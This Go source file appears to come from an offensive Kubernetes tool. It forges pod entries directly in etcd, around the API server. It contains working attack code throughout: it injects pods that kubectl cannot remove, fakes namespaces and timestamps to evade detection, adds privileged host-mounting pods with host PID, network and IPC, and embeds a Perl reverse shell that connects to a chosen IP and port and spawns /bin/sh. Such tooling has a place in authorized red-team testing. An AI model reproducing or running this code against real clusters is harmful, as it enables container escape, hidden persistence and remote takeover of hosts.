/*
Copyright 2017 The Kubernetes Authors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package cmd

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"time"

	"github.com/nccgroup/kubetcd/pkg/encoding"
	"github.com/spf13/cobra"
)

var (
	createLong = `Create pods as kubectl run`

	createExample = `kubetcd create pod <nameNewPod> -t <templatePod>`
)

var createCmd = &cobra.Command{
	Use:     "create",
	Short:   "Create new resources (only pods implemented by now)",
	Long:    createLong,
	Example: createExample,
	RunE: func(cmd *cobra.Command, args []string) error {
		resourceCreate = args[0]
		resourceNameCreate = args[1]
		return etcdctlCreate()
	},
}

type createOptions struct {
	//resource     string
	//resourceName string
	image         string
	cacert        string
	cert          string
	key           string
	endpoint      string
	namespace     string
	templateName  string
	node          string
	startTime     string
	persistence   string
	revShell      string
	privileged    bool
	fakenamespace bool
}

var createoptions *createOptions = &createOptions{}
var resourceCreate, resourceNameCreate string

func init() {
	RootCmd.AddCommand(createCmd)
	createCmd.Flags().StringVarP(&createoptions.image, "image", "i", "", "Change the image template")
	createCmd.Flags().StringVarP(&createoptions.endpoint, "endpoint", "", "127.0.0.1:2379", "Endopint. Default: 127.0.0.1:2379")
	createCmd.Flags().StringVarP(&createoptions.cacert, "cacert", "", "/etc/kubernetes/pki/etcd/ca.crt", "CA Certificate")
	createCmd.Flags().StringVarP(&createoptions.key, "key", "", "/etc/kubernetes/pki/etcd/server.key", "Key File")
	createCmd.Flags().StringVarP(&createoptions.cert, "cert", "", "/etc/kubernetes/pki/etcd/server.crt", "Server Certificate")
	createCmd.Flags().StringVarP(&createoptions.namespace, "namespace", "n", "default", "Namespace")
	createCmd.Flags().StringVarP(&createoptions.templateName, "template", "t", "", "Required. Choose a deployed resource as a template in the default namespace.")
	createCmd.Flags().StringVarP(&createoptions.node, "node", "", "", "Node to deploy")
	createCmd.Flags().StringVarP(&createoptions.startTime, "time", "", "", "Tamper start time. Format example: 2000-01-31T13:54:02Z")
	createCmd.Flags().StringVarP(&createoptions.revShell, "revshell", "r", "", "Define IP:PORT for a reverse shell")
	createCmd.Flags().StringVarP(&createoptions.persistence, "persistence", "p", "", "Custom entry name in ETCD for persistence. Only removable directly in ETCD, not by kubectl")
	createCmd.Flags().BoolVarP(&createoptions.privileged, "privileged", "P", false, "Add security context privileged:true.")
	createCmd.Flags().BoolVarP(&createoptions.fakenamespace, "fake-ns", "", false, "Inconsistent data for persistence. Fake the namespace entry in etcd but deployed in default namespace. Requires -n.")
}

func etcdctlCreate() error {
	if createoptions.templateName == "" {
		fmt.Println("--template/-t options is mandatory")
		return nil
	}
	var path string

	if strings.Contains(resourceCreate, "namespace") {
		path = "/registry/namespaces/" + createoptions.templateName
	} else {
		//Take the template from default namespace
		if createoptions.namespace != "default" {
			path = "/registry/" + resourceCreate + "s/default/" + createoptions.templateName
		} else {
			path = "/registry/" + resourceCreate + "s/" + createoptions.namespace + "/" + createoptions.templateName
		}

	}
	command := exec.Command("etcdctl",
		"--endpoints", createoptions.endpoint,
		"--cert", createoptions.cert,
		"--key", createoptions.key,
		"--cacert", createoptions.cacert,
		"get", path)
	fmt.Println("Path Template:" + path)
	command.Env = append(command.Env, "ETCDCTL_API=3")
	outputFile := "kubetcd.output"
	out, err := command.Output()
	if err != nil {
		return err
	}
	err = writeOutputToFile(outputFile, out)
	if err != nil {
		return err
	}
	//Call validateAndRun in decode.go, this will create kubectd.yaml with a template

	options.inputFilename = "kubetcd.output"
	fmt.Println("Deserializing...")
	encoding.IsGet = false
	validateAndRun()
	fmt.Println("Tampering data...")
	replaceInFile("kubetcd.yaml", "name: "+createoptions.templateName, "name: "+resourceNameCreate)
	replaceInFile("kubetcd.yaml", "run: "+createoptions.templateName, "run: "+resourceNameCreate)
	//Update namespace in the manifest if this is not default and fakenamespace options is set to false
	if !strings.Contains(createoptions.namespace, "default") && !createoptions.fakenamespace {
		updateParam("kubetcd.yaml", "  namespace", createoptions.namespace)
	}
	if createoptions.node != "" {
		updateParam("kubetcd.yaml", "  nodeName", createoptions.node)
	} else if createoptions.startTime != "" {
		updateParam("kubetcd.yaml", "  creationTimestamp", createoptions.startTime)
		updateParam("kubetcd.yaml", "    lastTransitionTime", createoptions.startTime)
		updateParam("kubetcd.yaml", "        startedAt", createoptions.startTime)
		updateParam("kubetcd.yaml", "startTime", createoptions.startTime)
	} else if createoptions.image != "" {
		updateParam("kubetcd.yaml", "  - image", createoptions.image)
		fmt.Println("Image:" + createoptions.image)
	}
	randomizeUID("kubetcd.yaml")

	encodeOpts.inputFilename = "kubetcd.yaml"
	fmt.Println("Serializing...")
	if createoptions.privileged {
		fmt.Println("Privileged SecurityContext Added")
		addSecurityContext("kubetcd.yaml")
	}
	encodeValidateAndRun()
	if createoptions.persistence != "" {
		resourceNameCreate = createoptions.persistence
	}
	if strings.Contains(resourceCreate, "namespace") {
		path = "/registry/namespaces/" + resourceNameCreate
	} else {
		path = "/registry/" + resourceCreate + "s/" + createoptions.namespace + "/" + resourceNameCreate
	}

	injectResource(path)
	os.Remove("kubetcd.proto")
	os.Remove("kubetcd.yaml")
	os.Remove("kubetcd.output")
	return nil
}

func replaceInFile(filename string, str1 string, str2 string) error {
	// Read the content of the file
	content, err := ioutil.ReadFile(filename)
	if err != nil {
		return err
	}

	// Replace all occurrences of str1 with str2
	updatedContent := strings.ReplaceAll(string(content), str1, str2)

	// Write the updated content back to the file
	err = ioutil.WriteFile(filename, []byte(updatedContent), os.ModePerm)
	if err != nil {
		return err
	}

	return nil
}

func updateParam(filename, parameter, newvalue string) error {
	// Open file for reading
	file, err := os.OpenFile(filename, os.O_RDWR, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	// Create a scanner to read the file line by line
	scanner := bufio.NewScanner(file)

	// Create a string builder to hold updated content
	var sb strings.Builder

	// Process each line
	for scanner.Scan() {
		line := scanner.Text()
		if strings.HasPrefix(line, parameter+":") {
			// Replace the value of nodeName
			line = fmt.Sprintf(parameter+": %s", newvalue)
		}
		sb.WriteString(line + "\n")
	}

	// Write the updated content back to the file
	err = file.Truncate(0)
	if err != nil {
		return err
	}
	_, err = file.Seek(0, 0)
	if err != nil {
		return err
	}
	_, err = file.WriteString(sb.String())
	if err != nil {
		return err
	}

	return nil
}

func injectResource(path string) {
	// Create a pipe to connect the output of the first command to the input of the second command
	reader, writer := io.Pipe()

	// Create the first command
	cmd1 := exec.Command("cat", "kubetcd.proto")

	// Set the output of the first command to the writer end of the pipe
	cmd1.Stdout = writer

	// Create the second command
	cmd2 := exec.Command("etcdctl",
		"--endpoints", createoptions.endpoint,
		"--cert", createoptions.cert,
		"--key", createoptions.key,
		"--cacert", createoptions.cacert,
		"put", path)
	cmd2.Env = append(cmd2.Env, "ETCDCTL_API=3")
	fmt.Println("Path injected: " + path)
	// Set the input of the second command to the reader end of the pipe
	cmd2.Stdin = reader

	// Create a buffer to store the output of the second command
	var output bytes.Buffer

	// Set the output of the second command to the buffer
	cmd2.Stdout = &output

	// Start both commands
	err := cmd1.Start()
	if err != nil {
		fmt.Println("Start1")
		fmt.Println(err)
		return
	}

	err = cmd2.Start()
	if err != nil {
		fmt.Println("Start2")
		fmt.Println(err)
		return
	}

	// Wait for both commands to finish
	err = cmd1.Wait()
	if err != nil {
		fmt.Println("Wait1")
		fmt.Println(err)
		return
	}

	err = writer.Close()
	if err != nil {
		fmt.Println("WriterClose")
		fmt.Println(err)
		return
	}

	err = cmd2.Wait()
	if err != nil {
		fmt.Println("Wait2")
		fmt.Println(err)
		return
	}

	// Print the output of the second command
	fmt.Println(output.String())
}

func addSecurityContext(filename string) error {
	// Open the file for reading and writing
	file, err := os.OpenFile(filename, os.O_RDWR, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	// Use a scanner to read the file line by line
	scanner := bufio.NewScanner(file)
	var lines []string
	for scanner.Scan() {
		line := scanner.Text()
		if strings.HasPrefix(line, "  - image:") {
			// Found the 'spec:' line, add the securityContext lines
			lines = append(lines, line)
			lines = append(lines, "    securityContext:")
			lines = append(lines, "      privileged: true")
			if len(strings.TrimSpace(createoptions.revShell)) > 0 {
				parts := strings.Split(createoptions.revShell, ":")
				if len(parts) == 2 {
					ipAddress := parts[0]
					port := parts[1]
					lines = append(lines, "    args:")
					lines = append(lines, "    - -e")
					lines = append(lines, "    - use Socket;$i=\""+ipAddress+"\";$p="+port+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};")
					lines = append(lines, "    command:")
					lines = append(lines, "    - perl")

				} else {
					fmt.Println("Invalid reverse shell. Format <IP>:<PORT>")
				}
			}
		} else if strings.HasPrefix(line, "spec:") {
			lines = append(lines, line)
			lines = append(lines, "  hostNetwork: true")
			lines = append(lines, "  hostPID: true")
			lines = append(lines, "  hostIPC: true")

		} else if strings.HasPrefix(line, "    volumeMounts:") {
			lines = append(lines, line)
			lines = append(lines, "    - mountPath: /host")
			lines = append(lines, "      name: roothost")
			lines = append(lines, "      readOnly: false")

		} else if strings.HasPrefix(line, "  volumes:") {
			lines = append(lines, line)
			lines = append(lines, "  - name: roothost")
			lines = append(lines, "    hostPath:")
			lines = append(lines, "      path: /")

		} else {
			// Not the 'spec:' line, just add the line to the output
			lines = append(lines, line)
		}
	}

	// Write the modified lines back to the file
	file.Seek(0, 0)
	file.Truncate(0)
	writer := bufio.NewWriter(file)
	for _, line := range lines {
		fmt.Fprintln(writer, line)
	}
	return writer.Flush()
}

func randomizeUID(filename string) error {
	// Read the contents of the file
	content, err := ioutil.ReadFile(filename)
	if err != nil {
		return fmt.Errorf("error reading file: %v", err)
	}

	// Define a regular expression to match the uid line
	uidRegex := regexp.MustCompile(`uid:\s+([0-9a-fA-F\-]+)`)

	// Find the first match of the uid line
	match := uidRegex.FindStringSubmatchIndex(string(content))

	if match == nil {
		return fmt.Errorf("no uid found in file")
	}

	// Generate a new random uid
	rand.Seed(time.Now().UnixNano())
	newUID := fmt.Sprintf("%08x-%04x-%04x-%04x-%012x", rand.Uint32(), rand.Uint32(), rand.Uint32(), rand.Uint32(), rand.Uint64())

	// Replace the old uid with the new uid in the content
	newContent := uidRegex.ReplaceAllString(string(content), fmt.Sprintf("uid: %s", newUID))

	// Write the new content back to the file
	if err := ioutil.WriteFile(filename, []byte(newContent), 0644); err != nil {
		return fmt.Errorf("error writing file: %v", err)
	}

	return nil
}
